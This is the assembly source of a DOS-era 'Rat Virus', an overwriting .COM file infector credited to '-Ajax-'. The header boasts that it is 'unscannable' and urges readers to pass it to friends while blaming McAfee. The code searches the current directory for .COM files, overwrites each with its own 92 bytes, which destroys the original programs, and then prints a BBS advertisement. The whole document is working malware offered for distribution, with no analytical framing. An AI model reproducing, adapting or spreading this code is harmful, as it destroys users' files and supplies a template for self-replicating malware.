  
PAGE  59,132
;*************************************
;**The Rat Virus - Overwriting      **
;**                Non-Resident     **
;**                Com File Infector**
;**                Author: -Ajax-   **
;** This virus is 92 bytes long     **
;** Because it is made in 1992 :)   **
;**/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/**
;** Pass this unscannable around to **
;** Your friends,and tell em McAfee **
;** sent ya!                        **
;**/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/**
;** Underground Asylum-904/688.6494 **
;**"Replication Is Our Middle Name!"**
;*************************************
 
retf            macro   ret_count               ; Fixup for Assembler
                ifdef   ret_count
                db      0CAh
                dw      ret_count
                elseif
                db      0CBh
                endif
endm
  
retn             macro  ret_count
                 ifdef  ret_count
                 db     0C2h
                 dw     ret_count
                 elseif
                 db     0C3h
                 endif
endm
  
movseg           macro reg16, unused, Imm16     ; Fixup for Assembler
                 ifidn  <reg16>, <bx>
                 db     0BBh
                 endif
                 ifidn  <reg16>, <cx>
                 db     0B9h
                 endif
                 ifidn  <reg16>, <dx>
                 db     0BAh
                 endif
                 ifidn  <reg16>, <si>
                 db     0BEh
                 endif
                 ifidn  <reg16>, <di>
                 db     0BFh
                 endif
                 ifidn  <reg16>, <bp>
                 db     0BDh
                 endif
                 ifidn  <reg16>, <sp>
                 db     0BCh
                 endif
                 ifidn  <reg16>, <BX>
                 db     0BBH
                 endif
                 ifidn  <reg16>, <CX>
                 db     0B9H
                 endif
                 ifidn  <reg16>, <DX>
                 db     0BAH
                 endif
                 ifidn  <reg16>, <SI>
                 db     0BEH
                 endif
                 ifidn  <reg16>, <DI>
                 db     0BFH
                 endif
                 ifidn  <reg16>, <BP>
                 db     0BDH
                 endif
                 ifidn  <reg16>, <SP>
                 db     0BCH
                 endif
                 dw     seg Imm16
endm
location_file   equ     9Eh                     ; location of file in DTA
  
seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
  
  
                org     100h                    ; Starting of all .COM files
  
rat_virus       proc    far
  
start:
                mov     ah,4Eh                  ; fixup for making undetectable
                mov     cl,20h                  ;      
                mov     dx,offset all_com_files ;                   
                int     21h                     ;                               
                                                ;                                    
start_infecting:
                mov     ax,3D01h                ;     
                mov     dx,Location_file        ;               
                int     21h                     ; Open target file.            
                                                                                   
                mov     bx,ax                     
                mov     dx,offset ds:[100h]     ; Location of file to write.
                mov     cl,5ch                  ; File size to overwrite.
                mov     ah,40h                  ;     
                int     21h                     ; Write to filename in dx        
                                                ;                                  
                mov     ah,3Eh                  ;     
                int     21h                     ;                                   
                                                ;                             
                mov     ah,4Fh                  ;    
                int     21h                     ;                               
                                                ;                           
                jnc     start_infecting         ; If more files,keep goin
                mov     ah,09h                  ; 
                mov     dx,offset bbs_ad        ; display my bbsad!
                int     21h
                int     20h                     ; get to dos.
all_com_files   db      2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h     ; data for all com files
                                                         ; in current dir..
bbs_ad          db      'Underground Asylum BBS - [904]688.6494$'
rat_virus       endp
  
seg_a           ends
                end     start
